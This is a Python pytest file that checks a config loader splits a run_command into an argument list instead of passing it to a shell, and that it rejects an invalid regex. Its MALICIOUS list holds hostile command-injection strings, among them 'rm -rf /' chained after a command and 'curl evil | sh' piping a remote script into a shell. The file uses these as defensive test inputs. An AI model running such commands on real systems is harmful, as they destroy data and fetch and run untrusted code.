import msgspec
import pytest

from new import schema


MALICIOUS = [
    "python train.py; rm -rf /",
    "python train.py && curl evil | sh",
    "python train.py `whoami`",
    "python train.py $(whoami)",
    "python train.py | tee /tmp/oops",
]


@pytest.mark.parametrize("cmd", MALICIOUS)
def test_run_command_split_not_shell(cmd):
    y = f"""
run_command: {cmd!r}
grep_pattern: "^val_loss:"
metric:
  name: val_loss
  direction: minimize
"""
    cfg = schema.load_config_yaml(y)
    assert isinstance(cfg.run_command, list)
    assert all(isinstance(x, str) for x in cfg.run_command)
    assert "sh" not in cfg.run_command[0]


def test_bad_regex_refused():
    with pytest.raises(msgspec.ValidationError):
        schema.load_config_yaml("""
run_command: python train.py
grep_pattern: "["
metric: {name: x, direction: minimize}
""")
